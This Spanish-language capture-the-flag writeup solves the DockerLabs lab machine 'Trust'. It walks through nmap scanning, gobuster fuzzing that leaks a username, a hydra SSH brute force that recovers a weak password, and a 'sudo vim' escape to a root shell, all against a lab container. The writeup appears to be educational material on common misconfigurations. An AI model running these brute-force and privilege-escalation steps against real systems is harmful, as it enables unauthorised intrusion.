# DockerLabs — Trust | Writeup

> Writeup de la máquina **Trust** de la plataforma [DockerLabs](https://dockerlabs.es).
> Dificultad: **Muy Fácil**

---

## Resumen

| Campo | Valor |
|---|---|
| **Plataforma** | DockerLabs |
| **Máquina** | Trust |
| **Dificultad** | Muy Fácil |
| **IP objetivo** | `172.21.0.2` |
| **Técnicas clave** | Fuzzing web · Fuga de credenciales · Fuerza bruta SSH · Escalada vía `sudo vim` |
| **Objetivo** | Conseguir acceso como `root` |

---

## Fase 1 — Reconocimiento

Escaneo completo de puertos y servicios:

```bash
sudo nmap -p- --open -sV -n -Pn 172.21.0.2
```

Entre los puertos abiertos encontramos un servicio **web (HTTP)** y **SSH**.

---

## Fase 2 — Enumeración web

Fuzzing de directorios y archivos sobre el servicio web:

```bash
gobuster dir -u http://172.21.0.2 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,php,txt,js \
  --exclude-length 10701
```

> `--exclude-length 10701` filtra las respuestas cuyo tamaño coincide con el de la página "no encontrada", evitando falsos positivos.

**Hallazgo relevante:** el endpoint `secret.php`, que al visitarlo muestra:

```
Hola Mario,
Esta web no se puede hackear.
```

El mensaje filtra un usuario del sistema: **`mario`**.

---

## Fase 3 — Obtención de credenciales

Con el usuario `mario` identificado, lanzamos un ataque de fuerza bruta contra el servicio SSH:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.21.0.2 ssh
```

**Resultado:** credenciales válidas.

```
login: mario
password: chocolate
```

---

## Fase 4 — Acceso inicial

Con las credenciales obtenidas, accedemos por SSH:

```bash
ssh mario@172.21.0.2
```

Acceso conseguido como el usuario `mario`.

---

## Fase 5 — Escalada de privilegios

Comprobamos qué binarios puede ejecutar `mario` con `sudo`:

```bash
sudo -l
```

El usuario tiene permiso para ejecutar `/usr/bin/vim` como root. `vim` permite ejecutar comandos de shell desde su modo de órdenes, lo que lo convierte en un vector clásico de escalada ([GTFOBins](https://gtfobins.github.io/gtfobins/vim/)):

```bash
sudo /usr/bin/vim
```

Dentro de `vim`:

```
:!/bin/bash
```

Esto abre una shell heredando los privilegios de `root`:

```bash
whoami
# root
```

Acceso **root** conseguido.

---

## Limpieza

Para eliminar el contenedor al terminar, se pulsa `Ctrl+C` en la terminal donde se ejecutó `auto_deploy.sh`.

---

## Conclusión

Trust es una máquina introductoria que combina varias fases típicas de un pentest:

1. **Reconocimiento** → `nmap` localiza los servicios web y SSH.
2. **Enumeración web** → `gobuster` descubre un endpoint (`secret.php`) que filtra un nombre de usuario válido.
3. **Fuerza bruta** → `hydra` recupera la contraseña del usuario contra una wordlist común.
4. **Acceso inicial** → login SSH con las credenciales obtenidas.
5. **Escalada de privilegios** → un permiso `sudo` mal configurado sobre `vim` permite escapar a una shell de root.

Lección clave: exponer pistas (nombres de usuario, contraseñas débiles) en páginas web y conceder permisos `sudo` sobre binarios con capacidad de ejecutar comandos (ver [GTFOBins](https://gtfobins.github.io/)) son errores de configuración habituales y fácilmente explotables.

---

> *Writeup realizado con fines educativos en un entorno de laboratorio controlado (DockerLabs).*
